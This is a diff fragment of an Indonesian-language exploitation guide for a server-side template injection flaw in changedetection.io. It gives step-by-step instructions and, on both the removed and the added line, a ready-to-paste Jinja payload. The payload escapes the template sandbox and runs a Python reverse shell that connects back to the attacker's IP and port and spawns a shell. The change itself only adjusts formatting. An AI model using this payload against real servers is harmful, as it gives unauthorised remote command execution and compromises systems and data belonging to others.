@@ -19,7 +19,8 @@ Kerentanan Server-Side Template Injection (SSTI) pada aplikasi changedetection.i
    *pastikan "Send a notification .." di centang*
 
 4. Pada "Notification URL List", input "gets://<ip>". Pada bagian "Notification Body", copy & paste payload dan ubah IP serta port.
-*payload: {{ self.__init__.__globals__.__builtins__.__import__('os').system('python -c \'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<your_ip>",<your_port>));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")\'') }}"
+
+*payload: {{ self.__init__.__globals__.__builtins__.__import__('os').system('python -c \'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<your_ip>",<your_port>));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")\'') }}*
 
 SAVE!!
 (Kembali ke Dashboard)
